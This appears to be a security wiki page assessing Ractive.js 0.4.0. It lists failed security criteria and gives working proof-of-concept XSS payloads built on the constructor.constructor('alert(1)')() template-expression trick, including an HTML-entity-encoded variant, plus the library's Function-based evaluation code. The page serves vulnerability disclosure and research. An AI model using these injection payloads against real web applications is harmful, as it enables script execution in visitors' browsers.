

# Introduction #

"Ractive.js is a template-driven UI library, but unlike other tools that generate inert HTML, it transforms your templates into blueprints for apps that are interactive by default.

Two-way binding, animations, SVG support and more are provided out-of-the-box – but you can add whatever functionality you need by downloading and creating plugins.

Some tools force you to learn a new vocabulary and structure your app in a particular way. Ractive works for you, not the other way around – and it plays well with other libraries."

From http://www.ractivejs.org/

# Quick Facts #

  * [Ractive.js 0.4.0 (Uncompressed)](http://cdn.ractivejs.org/latest/ractive.js)
  * Usage Stats http://trends.builtwith.com/javascript/RactiveJS


  * **{}SEC-A** <font color='red'><b>FAIL</b></font> Template expressions are equivalent to `eval`
  * **{}SEC-B** <font color='red'><b>FAIL</b></font> No sandbox or isolated execution scope, yet attempts to pre-parse expressions
  * **{}SEC-C** <font color='red'><b>FAIL</b></font> JavaScript code will be executed from within HTML element's `textContent`
  * **{}SEC-D** <font color='red'><b>FAIL</b></font> No enforced separation, no obvious way to outsource templates to static files
  * **{}SEC-E** <font color='red'><b>FAIL</b></font> No dedicated security response program, a mailing list exists though

# Injection Attacks #

## Ractive.js 0.4.0 ##

The modern web's new XSS vector using the constructor trick also works in Ractive.js. Important: we have to call the constructor of a native object like `String` or `Number` and cannot use the template expression's constructor. The latter would throw an error.

The following "paste-and-go"-ready code example demonstrates that.

```
<script src='http://cdn.ractivejs.org/latest/ractive.js'></script>
<div id="test">{{1..constructor.constructor("alert(1)")()}}</div>
<script>
new Ractive({template: '#test'});
</script>
```

Similar things can be done with list sections:

```
<script src='http://cdn.ractivejs.org/latest/ractive.js'></script>
<div id="test">{{#1..constructor.constructor('alert(1)')():num}}</div>
<script>
new Ractive({template: '#test'});
</script>
```

And, almost needless to say, encoded payload does the trick too:

```
<script src='http://cdn.ractivejs.org/latest/ractive.js'></script>
<div id="test">&#x7b;&#x7b;&#x23;1..constructor.constructor('alert(1)')():num&#x7d;&#x7d;</div>
<script>
new Ractive({template: '#test'});
</script>
```

## Eval via Function ##

As can be seen, very much like most other frameworks, Ractive.js is throwing templating expressions directly into the `Function` constructor for direct string-to-code. So, nothing new to see here, classic case over possible user-input meeting an `eval` equivalent.

```
function getFunctionFromString( str, i ) {
	var fn, args;
	str = str.replace( /\$\{([0-9]+)\}/g, '_$1' );
	if ( cache[ str ] ) {
		return cache[ str ];
	}
	args = [];
	while ( i-- ) {
		args[ i ] = '_' + i;
	}
	fn = new Function( args.join( ',' ), 'return(' + str + ')' );
	cache[ str ] = fn;
	return fn;
}
```

## Peculiarities ##

In Ractive.js, events are being declared by using dash-separated attribute names. This doesn't seem to be vulnerable but is worth a mention as it might aid an attacker in bypassing injection black-lists and do stuff to and with the existing code.

```
<script src='http://cdn.ractivejs.org/latest/ractive.js'></script>
<script id="template" type="text/ractive">
    <div on-click="test">Clickme</div>
</script>
<div id="el"></div>
<script>
r = new Ractive({
    template: '#template',
    el: '#el',
    data: {}
})
r.on('test', function(event) {
    alert(1)
})
</script>
```